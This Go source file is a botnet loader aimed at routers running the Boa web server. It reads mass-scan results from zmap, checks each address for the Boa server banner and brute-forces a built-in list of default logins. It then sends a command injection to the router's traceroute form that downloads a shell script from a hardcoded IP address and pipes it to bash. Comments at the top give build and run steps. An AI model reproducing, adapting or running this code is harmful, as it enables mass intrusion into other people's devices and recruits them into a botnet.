//yum install golang -y
//yum install epel-release -y (use this if golang dosnt install then install golang again)
//go build fiber.go; chmod 777 *; zmap -p 80 -win.zone.txt -q | ./fiber 80

package main

import (
  "bufio"
  "fmt"
  "math/rand"
  "net"
  "os"
  "strconv"
  "strings"
  "sync"
  "time"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "user:user", "admin:password", "default:default", "e8c:e8c"}

func zeroByte(a []byte) {
  for i := range a {
    a[i] = 0
  }
}

func sendExploit(target string) int {

  conn, err := net.DialTimeout("tcp", target, 60*time.Second)
  if err != nil {
    return -1
  }

  conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
  body := "target_addr=%3B%28curl%20http%3A%2F%2F84.200.81.239%2Fhiddenbin%2Fstardust.sh%20%7C%7C%20wget%20-qO-%20http%3A%2F%2F84.200.81.239%2Fhiddenbin%2Fstardust.sh%29%20%7C%20%28bash%20%7C%7C%20sh%29%0A&waninf=1_INTERNET_R_VID_"
  headers := "POST /boaform/admin/formTracert HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\nOrigin: http://" + target + "\r\nConnection: close\r\nReferer: http://" + target + "/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
  conn.Write([]byte(headers + body))
  conn.SetReadDeadline(time.Now().Add(60 * time.Second))

  bytebuf := make([]byte, 512)
  l, err := conn.Read(bytebuf)
  if err != nil || l <= 0 {
    conn.Close()
    return -1
  }

  return -1
}

func sendLogin(target string) int {

  var isLoggedIn int = 0

  for x := 0; x < len(loginsString); x++ {
    loginSplit := strings.Split(loginsString[x], ":")

    conn, err := net.DialTimeout("tcp", target, 60*time.Second)
    if err != nil {
      return -1
    }


    conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
    body := "username=" + loginSplit[0] + "&psd=" + loginSplit[1]
    headers := "POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
    conn.Write([]byte(headers + body))
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))

    bytebuf := make([]byte, 512)
    l, err := conn.Read(bytebuf)
    if err != nil || l <= 0 {
      conn.Close()
      return -1
    }

    if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
      isLoggedIn = 1
    }

    zeroByte(bytebuf)

    if isLoggedIn == 0 {
      conn.Close()
      continue
    }

    fmt.Println(fmt.Sprintf("[Logged into]: %s", conn.RemoteAddr().String()))
    statusLogins++
    conn.Close()
    break
  }

  if isLoggedIn == 1 {
    return 1
  } else {
    return -1
  }
}

func checkDevice(target string, timeout time.Duration) int {

  var isGpon int = 0

  conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
  if err != nil {
    return -1
  }
  conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
  body := "username=admin&psd=Feefifofum"
  headers := "POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
  conn.Write([]byte(headers + body))
  conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

  bytebuf := make([]byte, 512)
  l, err := conn.Read(bytebuf)
  if err != nil || l <= 0 {
    conn.Close()
    return -1
  }

  if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
    statusFound++
    isGpon = 1
  }
  zeroByte(bytebuf)

  if isGpon == 0 {
    conn.Close()
    return -1
  }

  conn.Close()
  return 1
}

func processTarget(target string, rtarget string) {

  defer syncWait.Done()

  if checkDevice(target, 10) == 1 {
    sendLogin(target)
    sendExploit(target)
    return
  } else {
    return
  }
}

func main() {

  rand.Seed(time.Now().UTC().UnixNano())
  var i int = 0
  go func() {
    for {
      fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
      time.Sleep(1 * time.Second)
      i++
    }
  }()

  for {
    r := bufio.NewReader(os.Stdin)
    scan := bufio.NewScanner(r)
    for scan.Scan() {
      go processTarget(scan.Text()+":"+os.Args[1], scan.Text())
      statusAttempted++
      syncWait.Add(1)
    }
  }
}
